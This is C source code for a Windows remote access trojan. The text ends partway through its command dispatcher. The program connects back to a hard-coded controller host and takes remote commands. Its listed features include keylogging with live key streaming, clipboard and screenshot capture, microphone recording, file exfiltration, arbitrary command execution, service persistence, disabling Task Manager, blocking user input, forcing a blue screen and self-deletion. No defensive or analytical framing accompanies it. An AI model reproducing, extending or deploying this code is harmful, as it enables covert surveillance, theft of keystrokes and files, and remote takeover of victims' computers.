#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlwapi.h>
#include <time.h>

#include "main.h"
#include "shell_all.h"
#include "shell.h"

// global vars
BOOL running = TRUE;
BOOL stopService = FALSE;
int ps1mode = 0;
SOCKET gl_sock = INVALID_SOCKET;

int cmdFailed(SOCKET sock) {
	sendE(sock, SHELL_STRING_MSG_MISSINGARGS, strlen(SHELL_STRING_MSG_MISSINGARGS), 0);
	return 0;
}

const char* getHelp() { 

	#if SHELL_MASK
	
	return SHELL_STRING_MSG_HELPDISABLED;
	
	#else
	
	return
	"\n"
	"===[ GET INFO ]===\n"
	" help   - print help\n"
	" pwd    - print current working directory (%CD%)\n"
	" banner - print banner (common info, ...)\n"
	" exe    - print exe location\n"
	" exedir - print exe location (dir only)\n"
	" exip   - print public ip\n"
	" clip   - print clipboard text\n"
	"\n"
	"===[ START ]===\n"
	" run <command>    - run command in CMD\n"
	" bg <command>     - run command in CMD in the background (no IO)\n"
	" proc <program>   - start program & redirect IO\n"
	" procbg <program> - start program in the background (no IO)\n"
	" bp <program>     - start program in user env\n"
	" user             - 'bp <exePath> user' - start shell as user (in user env)\n"
	" keylog           - 'bp <exePath> keylog' - start shell as a keylogger only (in user env)\n"
	" ***              - all other commands are redirected to CMD (run)\n"
	"\n"
	"===[ ALIASES ]===\n"
	" id       - alias for \"whoami\"\n"
	" poweroff - alias for \"shutdown /s /t 1\"\n"
	" reboot   - alias for \"shutdown /r /t 1\"\n"
	" disks    - alias for \"wmic logicaldisk get name\"\n"
	" titles   - alias for \"tasklist /v /fo list | find /i \"window title\" | find /v \"N/A\"\"\n"
	" dumplog  - alias for \"type \"C:\\Windows\\Temp\\keys.log\"\"\n"
	" .        - repeat last command\n"
	"\n"
	"===[ SETTINGS ]===\n"
	" ps1none - no prompt\n"
	" ps1mini - prompt: '$' (default)\n"
	" ps1full - prompt: 'pwd$'\n"
	"\n"
	"====[ CD ]====\n"
	" cd <path> - change dir\n"
	" dx        - change dir to current user's desktop\n"
	" cdx       - change dir to exe dir\n"
	" temp      - change dir to %TEMP%\n"
	" appdata   - change dir to %APPDATA%\n"
	"\n"
	"====[ KEYLOGGER ]====\n"
	" kl <file>  - start keylogger, write the keys to a file\n"
	" klstop     - stop the keylogger\n"
	" klclean    - enable cleaner logging... (this is by default on)\n"
	" lkl        - start live keylogger, connect back and stream the keys\n"
	" lklstop    - stop live keylogger\n"
	" lklclean   - enable cleaner logging... (this is by default on)\n"
	"\n"
	"====[ ADMIN CONTROL / JOKES / EXPLOITS ]====\n"
	" kill <name | id>    - kill process by name or id\n"
	" lp <grep(optional)> - list processes\n"
    " bion                - disable/block user input (note: uses BlockInput())\n"
    " bioff               - enable/unblock user input\n"
	" bieon               - block input exploit (note: creates an input hook that filters keys)\n"
	" bieoff              - stop block input exploit\n"
    " atkon               - disable taskmgr, regedit, services, ... (it just kills them instantly)\n"
    " atkoff              - enable taskmgr and regedit\n"
	" fmuon               - force mixer unmute (raise the volume to max & unmute when playing wav/mp3 files)\n"
	" fmuoff              - stop force mixer unmute\n"
    " cmon                - make mouse unusable by making it go in circles\n"
    " cmoff               - stop mouse from going in circles\n"
    " kbdon               - keyboard disco lights\n"
    " kbdoff              - stop keyboard disco\n"
	" openclip            - open the clipboard (disables other programs from using the clipboard)\n"
	" closeclip           - close the clipboard (reallow other programs from using the clipboard)\n"
	" sk <keysToSend>     - simulate key presses (type 'sk' for help)\n"
	" rec <ms>            - record mic & save file to rec.wav\n"
	" recbg <ms>          - 'rec' in the background\n"
	" bsod                - cause blue screen of death\n"
	"\n"
	"====[ MEDIA ]====\n"
	" playwav <filePath.wav>  - play wav file\n"
	" loopwav <filePath.wav>  - play wav file repeatedly\n"
	" stopwav                 - stop playing wav file\n"
	" playmp3 <filePath.mp3>  - open and play mp3 file\n"
	" loopmp3                 - enable looping\n"
	" pausemp3                - pause the currently playing mp3 file\n"
	" resumemp3               - resume playing the mp3 file\n"
	" stopmp3                 - stop playing mp3 file and close it\n"
	" ss <fileName(optional)> - take screenshot and save it as a bmp file\n"
	"\n"
	"===[ TRANSFER FILES ]===\n"
	" sf <filePath>   - send file\n"
	" rf <filePath>   - receive file\n"
	" sfbg <filePath> - send file, connect from another thread\n"
	" rfbg <filePath> - receive file, connect from another thread\n"
	" sssf            - take a screenshot and send it\n"
	"\n"
	"===[ QUIT ]===\n"
	" exit     - close connection\n"
	" stop     - stop the program (if it's running in a service it won't be stopped)\n"
	" stopserv - stop the program's service\n"
	" suicide  - self destruction (quit, delete service & program)\n"
	"\n"
	;
	
	#endif
}

void main_wsa_init() {
	DPL("init winsock...");
	
	WSADATA wsData;
	if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { DPL("winsock failed"); exit(1); }
	
	DPL("init winsock!");
}
int main_wsa_shutdown() {
	return WSACleanup();
}

SOCKET main_connect() {
	
	while (running) {
		Sleep(SHELL_RETRY_MS);
		
		// create socket
		DPL("socket...");
		//SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		gl_sock = sock;
		if (sock == INVALID_SOCKET) { DPL("failed to create socket"); continue; }
		DPL("socket - ok");
		
		// setup address
		struct sockaddr_in addr;
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(SHELL_STRING_HOST_IP);  
		addr.sin_port = htons(HOST_PORT);    
		
		// connect, if it fails sleep then retry
		DPL("connecting...");
		D(printf("IP: %s\n", SHELL_STRING_HOST_IP));
		if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) { DPL("failed to connect"); closesocket(sock); continue; }
		// WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)
		
		DWORD timeout = 10000;
		setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
	
		return sock;
	}
	
	return INVALID_SOCKET;
}
int main_sendBanner(SOCKET sock, SHELL_MODES mode) {
	
	char buff[BIGSIZ] = {0};
	
	// send primebd start msg
	const char* modeStr = SHELL_STRING_MODE_UNKNOWN;
	switch (mode) {
		case SHELL_MODE_KEYLOG:  modeStr = SHELL_STRING_MODE_KEYLOG;  break;
		case SHELL_MODE_USER:    modeStr = SHELL_STRING_MODE_USER;    break;
		case SHELL_MODE_SERVICE: modeStr = SHELL_STRING_MODE_SERVICE; break;
	}
	DWORD pid = GetCurrentProcessId();
	DWORD sessionID;
	ProcessIdToSessionId(pid, &sessionID);
	const char* env_username = getenv(SHELL_STRING_GETENV_USERNAME);
	const char* env_userdomain = getenv(SHELL_STRING_GETENV_USERDOMAIN);
	
	snprintf(buff, BIGSIZ,
		"ENV[%s]" " "
		#ifdef _WIN64
		"PID[%lu]" " "
		"SID[%lu]" " "
		#else 
		"PID[%lu]" " "
		"SID[%lu]" " "
		#endif
		"USERNAME[%s]" " "
		"USERDOMAIN[%s]"
		"\n"
		,
		
	modeStr, pid, sessionID, env_username, env_userdomain);
	
	 
	sendE(sock, buff, strlen(buff), 0);
	return 1;
}
int main_sendPrompt(SOCKET sock) {
	int ret = SOCKET_ERROR;
	switch (ps1mode) {
		case 1: {
			char prompt[] = "$\n"; 
			ret = sendE(sock, prompt, strlen(prompt), 0);
			break;
		}
		case 2: {
			char text[MAX_PATH+8] = {0};
			getcwd(text, MAX_PATH);
			strcat(text, " $\n");
			ret = sendE(sock, text, strlen(text), 0);
			break;
		}
	}
	
	return ret;
}
BOOL main_getCMD(SOCKET sock, char* cmd_p) {
	// get command
	DPL("recvE begin");
	int r = recvE(sock, cmd_p, BIGSIZ, 0);
	DPL("recvE stop");
	if (r == SOCKET_ERROR || r == 0) {
		DPL("connection died");
		return FALSE;
	}
	
	// remove newline at the end for commands
	if (cmd_p[r-1] == '\n') { cmd_p[r-1] = '\0'; }
	
	return TRUE;
}
int main_getCMD_1n2(const char* cmd_p, char* str1, char* str2) {
	BOOL sawSpace = FALSE;
	int i1 = 0;
	int i2 = 0;
	for (size_t i = 0; i < strlen(cmd_p); i++) {
		if (!sawSpace && cmd_p[i] == ' ') { sawSpace = TRUE; continue; }
		if (sawSpace) {
			str2[i2] = cmd_p[i];
			i2++;
		}
		else {
			str1[i1] = cmd_p[i];
			i1++;
		}
	}
	return 1;
}
int main_cmd_stop(SOCKET sock) {
	// stop shell?
	char buff[BIGSIZ] = {0};
	if (sendE(sock, SHELL_STRING_STOPSHELL, strlen(SHELL_STRING_STOPSHELL), 0) == SOCKET_ERROR) { return 0; }
	if (recvE(sock, buff, BIGSIZ, 0) <= 0) { return 0; }
	if (strcmp(buff, "y\n") == 0) { running = FALSE; return 1; }
	return 0;
}
int main_cmd_stopserv(SOCKET sock) {
	// stop shell?
	char buff[BIGSIZ] = {0};
	if (sendE(sock, SHELL_STRING_STOPSERV, strlen(SHELL_STRING_STOPSERV), 0) == SOCKET_ERROR) { return 0; }
	if (recvE(sock, buff, BIGSIZ, 0) <= 0) { return 0; }
	if (strcmp(buff, "y\n") == 0) { running = FALSE; stopService = TRUE; return 1; }
	return 0;
}
int suicide() {
	
	// delete service
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); // get SCM database handle
	SC_HANDLE serv = OpenService(schSCManager, SHELL_SERVICE_NAME, SC_MANAGER_ALL_ACCESS);
	DeleteService(serv);
	
	// delete program
	char cmd[MAX_PATH + 64] = {0};
	char text[MAX_PATH] = {0};
	GetModuleFileName(NULL, text, MAX_PATH);
	snprintf(cmd, MAX_PATH + 64, SHELL_STRING_SPRINTF_TIMEOUTDEL, text);
	runCMD_bg(cmd);
	return 1;
}
int main_cmd_suicide(SOCKET sock) {
	// stop shell?
	char buff[BIGSIZ] = {0};
	if (sendE(sock, SHELL_STRING_SUICIDE, strlen(SHELL_STRING_SUICIDE), 0) == SOCKET_ERROR) { return 0; }
	if (recvE(sock, buff, BIGSIZ, 0) <= 0) { return 0; }
	if (strcmp(buff, "y\n") == 0) { running = FALSE; stopService = TRUE; return suicide(); }
	return 0;
}
int main_cmd_help(SOCKET sock) {
	const char* buff = getHelp();
	sendE(sock, buff, strlen(buff), 0);
	return 1;
}
int main_cmd_pwd(SOCKET sock) {
	char text[MAX_PATH+8] = {0};
	getcwd(text, MAX_PATH);
	strcat(text, "\n");
	sendE(sock, text, strlen(text), 0);
	return 1;
}
int main_cmd_exe(SOCKET sock) {
	char text[MAX_PATH+8] = {0};
    GetModuleFileName(NULL, text, MAX_PATH);
	strcat(text, "\n");
	sendE(sock, text, strlen(text), 0);
	return 1;
}
int main_cmd_exedir(SOCKET sock) {
	char text[MAX_PATH+8] = {0};
    GetModuleFileName(NULL, text, MAX_PATH);
	#if (NTDDI_VERSION >= NTDDI_WIN8)
		PathCchRemoveFileSpec(text, MAX_PATH);
	#else
		PathRemoveFileSpec(text);
	#endif
	strcat(text, "\n");
	sendE(sock, text, strlen(text), 0);
	return 1;
}
int main_cmd_exip(SOCKET sock) {
	char buff[SMALLSIZ+2] = {0};
	long unsigned int read;
	getPublicIP(buff, SMALLSIZ, &read);
	int l = strlen(buff);
	buff[l] = '\n';
	sendE(sock, buff, strlen(buff), 0);
	return 1;
}
int main_cmd_clip(SOCKET sock) {
	char* text = getClipboardText();
	if (text == NULL) { return 0; }
	int r = sendE(sock, text, strlen(text), 0);
	if (r == 0 || r == SOCKET_ERROR) { return 0; }
	free(text);
	return 1;
}
int changeDir(SOCKET sock, const char* path) {
	
	if (chdir(path)) {
		sendE(sock, SHELL_STRING_MSG_CHDIRFAILED, strlen(SHELL_STRING_MSG_CHDIRFAILED), 0);
		return 0;
	}
	return 1;
}
int main_cmd_cd(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return changeDir(sock, str2);
}
int main_cmd_dx(SOCKET sock) {
	char path[MAX_PATH] = {0};
	snprintf(path, MAX_PATH, SHELL_STRING_SPRINTF_DESKTOP, getenv(SHELL_STRING_GETENV_USERNAME));
	return changeDir(sock, path);
}
int main_cmd_cdx(SOCKET sock) {
	char text[MAX_PATH+2] = {0};
    GetModuleFileName(NULL, text, MAX_PATH);
	#if (NTDDI_VERSION >= NTDDI_WIN8)
		PathCchRemoveFileSpec(text, MAX_PATH);
	#else
		PathRemoveFileSpec(text);
	#endif
	return changeDir(sock, text);
}
int main_cmd_temp(SOCKET sock) {
	return changeDir(sock, getenv(SHELL_STRING_GETENV_TEMP));
}
int main_cmd_temp2(SOCKET sock) {
	return changeDir(sock, SHELL_STRING_PATH_TEMP);
}
int main_cmd_appdata(SOCKET sock) {
	return changeDir(sock, getenv(SHELL_STRING_GETENV_APPDATA));
}
int main_cmd_playwav(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return PlaySound(str2, NULL, SND_ASYNC);
}
int main_cmd_loopwav(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return PlaySound(str2, NULL, SND_ASYNC | SND_LOOP);
}
int main_cmd_stopwav() {
	return PlaySound(0, 0, 0);
}
MCIERROR main_cmd_playmp3(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	char* c = SHELL_STRING_SPRINTF_MCI_OPENMP3;
	int l = strlen(str2) + strlen(c) + 16;
	char* newBuff = (char*)calloc(l, sizeof(char));
	snprintf(newBuff, l, c, str2);
	MCIERROR ret = mciSendString(newBuff, NULL, 0, NULL);
	mciSendString(SHELL_STRING_MCI_PLAYMP3, NULL, 0, NULL);
	free(newBuff);
	return ret;
}
MCIERROR main_cmd_loopmp3() {
	return mciSendString(SHELL_STRING_MCI_PLAYMP3REPEAT, NULL, 0, NULL); 
}
MCIERROR main_cmd_pausemp3() {
	return mciSendString(SHELL_STRING_MCI_PAUSEMP3, NULL, 0, NULL);
}
MCIERROR main_cmd_resumemp3() {
	return mciSendString(SHELL_STRING_MCI_RESUMEMP3, NULL, 0, NULL);
}
int main_cmd_stopmp3() {
	mciSendString(SHELL_STRING_MCI_STOPMP3, NULL, 0, NULL);
	mciSendString(SHELL_STRING_MCI_CLOSEMP3, NULL, 0, NULL);
	return 0;
}
int main_cmd_sf(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return sendFile(sock, str2);
}
int main_cmd_rf(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return recvFile(sock, str2);
}
HANDLE main_cmd_sfbg(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { cmdFailed(sock); return NULL; }
	return sendFile_bg(str2);
}
HANDLE main_cmd_rfbg(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { cmdFailed(sock); return NULL; }
	return recvFile_bg(str2);
}
int main_cmd_run(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return runCMD(sock, str2);
}
int main_cmd_bg(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	if (!runCMD_bg(str2)) {
		sendE(sock, SHELL_STRING_MSG_FAILEDTORUNCMD, strlen(SHELL_STRING_MSG_FAILEDTORUNCMD), 0);
		return 0;
	}
	return 1;
}
int main_cmd_proc(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	
	int r = runProc(sock, str2);
	if (r == SOCKET_ERROR) { return r; }
	if (r == 0) {
		sendE(sock, SHELL_STRING_MSG_FAILEDTORUN, strlen(SHELL_STRING_MSG_FAILEDTORUN), 0);
	}
	return 1;
}
int main_cmd_procbg(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	
	if (!runProc_bg(str2)) {
		sendE(sock, SHELL_STRING_MSG_FAILEDTORUN, strlen(SHELL_STRING_MSG_FAILEDTORUN), 0);
	}
	return 1;
}
int main_cmd_bp(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return bypass(sock, str2);
}

int startSHELL(SOCKET sock, const char* arg) {
	char cmd[MAX_PATH + 10] = {0};
	char text[MAX_PATH] = {0};
	GetModuleFileName(NULL, text, MAX_PATH);
	snprintf(cmd, MAX_PATH + 10, "\"%s\" \"%s\"", text, arg);
	return bypass(sock, cmd);
}
int main_cmd_user(SOCKET sock) {
	return startSHELL(sock, SHELL_STRING_CMD_USER);
}
int main_cmd_keylog(SOCKET sock) {
	return startSHELL(sock, SHELL_STRING_CMD_KEYLOG);
}
int main_cmd_openclip(SOCKET sock) {
	if (!OpenClipboard(NULL)) {
		sendE(sock, SHELL_STRING_MSG_CLIPBOARD_OPEN_FAIL, strlen(SHELL_STRING_MSG_CLIPBOARD_OPEN_FAIL), 0);
		return 0;
	}
	
	sendE(sock, SHELL_STRING_MSG_CLIPBOARD_OPEN_SUCC, strlen(SHELL_STRING_MSG_CLIPBOARD_OPEN_SUCC), 0);
	return 1;
}
int main_cmd_closeclip(SOCKET sock) {
	if (!CloseClipboard()) {
		sendE(sock, SHELL_STRING_MSG_CLIPBOARD_CLOSE_FAIL, strlen(SHELL_STRING_MSG_CLIPBOARD_CLOSE_FAIL), 0);
		return 0;
	}
	
	sendE(sock, SHELL_STRING_MSG_CLIPBOARD_CLOSE_SUCC, strlen(SHELL_STRING_MSG_CLIPBOARD_CLOSE_SUCC), 0);
	return 1;
}
HANDLE main_cmd_kl(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { cmdFailed(sock); return NULL; }
	return keylog_init(str2);
}
int main_cmd_klstop(SOCKET sock) {
	sendE(sock, SHELL_STRING_MSG_KEYLOGGER_STOPPING, strlen(SHELL_STRING_MSG_KEYLOGGER_STOPPING), 0);
	keylog_stop();
	sendE(sock, SHELL_STRING_MSG_KEYLOGGER_STOPPED, strlen(SHELL_STRING_MSG_KEYLOGGER_STOPPED), 0);
	return 0;
}
int main_cmd_klclean(SOCKET sock) {
	keylog_clean_set(!keylog_clean_get());
	char msg[MIDSIZ] = {0};
	snprintf(msg, MIDSIZ, SHELL_STRING_SPRINTF_KEYLOGGER_CLEAN, keylog_clean_get() ? SHELL_STRING_ON : SHELL_STRING_OFF);
	sendE(sock, msg, strlen(msg), 0);
	return 0;
}
HANDLE main_cmd_lkl() {
	return livekeylog_init();
}
int main_cmd_lklstop(SOCKET sock) {
	sendE(sock, SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPING, strlen(SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPING), 0);
	livekeylog_stop();
	sendE(sock, SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPED, strlen(SHELL_STRING_MSG_LIVEKEYLOGGER_STOPPED), 0);
	return 0;
}
int main_cmd_lklclean(SOCKET sock) {
	livekeylog_clean_set(!livekeylog_clean_get());
	char msg[MIDSIZ] = {0};
	snprintf(msg, MIDSIZ, SHELL_STRING_SPRINTF_LIVEKEYLOGGER_CLEAN, livekeylog_clean_get() ? SHELL_STRING_ON : SHELL_STRING_OFF);
	sendE(sock, msg, strlen(msg), 0);
	return 0;
}
int main_cmd_ss(SOCKET sock, const char* str2) {
	if (!screenshot(str2[0] == '\0' ? NULL : str2)) {
		sendE(sock, SHELL_STRING_MSG_SSFAILED, strlen(SHELL_STRING_MSG_SSFAILED), 0);
		return 0;
	}
	return 1;
}
int main_cmd_sssf(SOCKET sock) {
	/*
	char path[MAX_PATH] = {0};
	snprintf(path, MAX_PATH, SHELL_STRING_SPRINTF_SSSF, getenv(SHELL_STRING_GETENV_TEMP), time(0));
	screenshot(path);
	sendFile(sock, path);
	remove(path);
	//*/
	
	screenshot_send(sock);

	return 1;
}

HANDLE main_cmd_msg(const char* str2) {
	return admin_msg(str2);
}
int main_cmd_lp(SOCKET sock, const char* str2) {
	return listproc(sock, str2[0] == '\0' ? NULL : str2);
}
int main_cmd_kill(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') { return cmdFailed(sock); }
	return kill(sock, str2);
}
int main_cmd_sk(SOCKET sock, const char* str2) {
	if (str2[0] == '\0') {
		#if SHELL_MASK
		sendE(sock, SHELL_STRING_MSG_HELPDISABLED, strlen(SHELL_STRING_MSG_HELPDISABLED), 0);
		#else
		const char* buff = sendkeys_help();
		sendE(sock, buff, strlen(buff), 0);
		#endif
		
		return 0;
	}
	
	return sendkeys(str2);
}
void main_cmd_cmon()   { admin_cm_on();   }
void main_cmd_cmoff()  { admin_cm_off();  }
void main_cmd_kbdon()  { admin_kbd_on();  }
void main_cmd_kbdoff() { admin_kbd_off(); }
void main_cmd_atkon()  { admin_atk_on();  }
void main_cmd_atkoff() { admin_atk_off(); }
void main_cmd_bion()   { admin_bi_on();   }
void main_cmd_bioff()  { admin_bi_off();  }
void main_cmd_bieon()  { admin_bie_on();  }
void main_cmd_bieoff() { admin_bie_off(); }
void main_cmd_fmuon()  { admin_fmu_on();  }
void main_cmd_fmuoff() { admin_fmu_off(); }

DWORD main_cmd_rec(const char* str2) {
	return recMic(str2);
}
HANDLE main_cmd_recbg(const char* str2) {
	return recMic_bg(str2);
}

void main_cmd_bsod() { bsod(); }

int load_settings() {
    FILE* fp = fopen(SHELL_STRING_PATH_TEMP_SET_INI, "r");
    if (!fp) { DPL("settings - failed to open file"); return 0; }

    char buffer[SMALLSIZ];
    while (fgets(buffer, SMALLSIZ-1, fp)) {
        buffer[strcspn(buffer, "\n")] = 0; // remove newline
		if (!strcmp(buffer, SHELL_STRING_CMD_CMON))  { admin_cm_on();   }
		if (!strcmp(buffer, SHELL_STRING_CMD_KBDON)) { admin_kbd_on();  }
		if (!strcmp(buffer, SHELL_STRING_CMD_ATKON)) { admin_atk_on();  }
		if (!strcmp(buffer, SHELL_STRING_CMD_BION))  { admin_bi_on();   }
		if (!strcmp(buffer, SHELL_STRING_CMD_BIEON)) { admin_bie_on();  }
		if (!strcmp(buffer, SHELL_STRING_CMD_FMUON)) { admin_fmu_on();  }
    }
    fclose(fp);
    return 1;
}

int shell_main(SHELL_MODES mode) {
	
	DPL("INIT: MAIN_SHELL");

	D(
		switch (mode) {
			case SHELL_MODE_KEYLOG:  DPL("shell mode: KEYLOG");  break;
			case SHELL_MODE_USER:    DPL("shell mode: USER");    break;
			case SHELL_MODE_SERVICE: DPL("shell mode: SERVICE"); break;
		}
	);

	// init all the settings
	#if SHELL_STARTUP_KEYLOGGER
	if (mode == SHELL_MODE_SERVICE) { main_cmd_keylog(INVALID_SOCKET); }
	if (mode == SHELL_MODE_KEYLOG) { keylog_init(SHELL_STRING_PATH_TEMP_KEYS_LOG); Sleep(INFINITE); keylog_stop(); return 1; }
	#endif
	
	#if SHELL_ENSURE_PERSISTENCY
	load_settings();
	#endif
	
	// init WSA
	main_wsa_init();
	
	// vars
	char cmd_last[BIGSIZ] = {0};
	char cmd_p[BIGSIZ] = {0};
	char str1[BIGSIZ] = {0};
	char str2[BIGSIZ] = {0};
	
	while (running) {
		DPL("main loop");
		
		SOCKET sock = main_connect();
		
		if (!main_sendBanner(sock, mode)) { closesocket(sock); continue; }
		
		while (running) {
			DPL("main loop2");
			
			main_sendPrompt(sock);
			
			// get command
			memset(cmd_p, 0, BIGSIZ);
			if (!main_getCMD(sock, cmd_p)) { break; }
			
			// if command is empty go back
			if (cmd_p[0] == '\0') { continue; }
			
			// repeat cmd
			if (!strcmp(cmd_p, ".")) { strcpy(cmd_p, cmd_last);         }
			else                     { memcpy(cmd_last, cmd_p, BIGSIZ); }
			
			// get first & second token
			memset(str1, 0, BIGSIZ);
			memset(str2, 0, BIGSIZ);
			main_getCMD_1n2(cmd_p, str1, str2);
			
			D(
				printf("cmd_p : %s\n", cmd_p);
				printf("str1  : %s\n", str1);
				printf("str2  : %s\n", str2);
				printf("last  : %s\n", cmd_last);
				
				#define maxbuff 32
				printf("cmd_p > "); for (int i = 0; i < maxbuff; i++) { printf("%d ", cmd_p[i]);    } printf("\n");
				printf("str1  > "); for (int i = 0; i < maxbuff; i++) { printf("%d ", str1[i]);     } printf("\n");
				printf("str2  > "); for (int i = 0; i < maxbuff; i++) { printf("%d ", str2[i]);     } printf("\n");
				printf("last  > "); for (int i = 0; i < maxbuff; i++) { printf("%d ", cmd_last[i]); } printf("\n");
			);
			
			if (!strcmp(cmd_p, SHELL_STRING_CMD_EXIT))     { break; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_STOP))     { if (main_cmd_stop(sock)) { break; } continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_STOPSERV)) { if (main_cmd_stopserv(sock)) { break; } continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_SUICIDE))  { if (main_cmd_suicide(sock)) { break; } continue; }
			
			if (!strcmp(cmd_p, SHELL_STRING_CMD_HELP))   { main_cmd_help(sock);         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_PWD))    { main_cmd_pwd(sock);          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_BANNER)) { main_sendBanner(sock, mode); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_EXE))    { main_cmd_exe(sock);          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_EXEDIR)) { main_cmd_exedir(sock);       continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_EXIP))   { main_cmd_exip(sock);         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_CLIP))   { main_cmd_clip(sock);         continue; }
			
			// ps1 settings
			if (!strcmp(cmd_p, SHELL_STRING_CMD_PS1NONE)) { ps1mode = 0; continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_PS1MINI)) { ps1mode = 1; continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_PS1FULL)) { ps1mode = 2; continue; }
			
			// cd
			if (!strcmp(str1,  SHELL_STRING_CMD_CD))      { main_cmd_cd(sock, str2); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_TEMP))    { main_cmd_temp(sock);      continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_TEMP2))   { main_cmd_temp2(sock);     continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_APPDATA)) { main_cmd_appdata(sock);   continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_DX))      { main_cmd_dx(sock);        continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_CDX))     { main_cmd_cdx(sock);       continue; }
			
			// aliases
			if (!strcmp(cmd_p, SHELL_STRING_CMD_ID))       { runCMD(sock, SHELL_STRING_CMD_ID2);     continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_DISKS))    { runCMD(sock, SHELL_STRING_CMD_DISKS2);  continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_TITLES))   { runCMD(sock, SHELL_STRING_CMD_TITLES2); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_POWEROFF)) { runCMD_bg(SHELL_STRING_CMD_POWEROFF2); running = FALSE; break; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_REBOOT))   { runCMD_bg(SHELL_STRING_CMD_REBOOT2);   running = FALSE; break; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_DUMPLOG))  { runCMD(sock, SHELL_STRING_CMD_DUMPLOG2); continue; }
			
			// play
			if (!strcmp(str1,  SHELL_STRING_CMD_PLAYWAV)) { main_cmd_playwav(sock, str2); continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_LOOPWAV)) { main_cmd_loopwav(sock, str2); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_STOPWAV)) { main_cmd_stopwav();           continue; }
			
			if (!strcmp(str1,  SHELL_STRING_CMD_PLAYMP3))   { main_cmd_playmp3(sock, str2); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_LOOPMP3))   { main_cmd_loopmp3();           continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_PAUSEMP3))  { main_cmd_pausemp3();          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_RESUMEMP3)) { main_cmd_resumemp3();         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_STOPMP3))   { main_cmd_stopmp3();           continue; }
			
			// screenshot
			if (!strcmp(str1,  SHELL_STRING_CMD_SS))   { main_cmd_ss(sock, str2); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_SSSF)) { main_cmd_sssf(sock);     continue; }
			
			if (!strcmp(str1, SHELL_STRING_CMD_MSG)) { main_cmd_msg(str2); continue; }
			
			// admin stuff
			if (!strcmp(str1,  SHELL_STRING_CMD_LP))        { main_cmd_lp(sock, str2);   continue; }
			if (!strcmp(str1,  SHELL_STRING_CMD_KILL))      { main_cmd_kill(sock, str2); continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_CMON))      { main_cmd_cmon();           continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_CMOFF))     { main_cmd_cmoff();          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_KBDON))     { main_cmd_kbdon();          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_KBDOFF))    { main_cmd_kbdoff();         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_ATKON))     { main_cmd_atkon();          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_ATKOFF))    { main_cmd_atkoff();         continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_BION))      { main_cmd_bion();           continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_BIOFF))     { main_cmd_bioff();          continue; }
			if (!strcmp(cmd_p, SHELL_STRING_CMD_BIEON))     { main_cmd_bieon();          continue; }
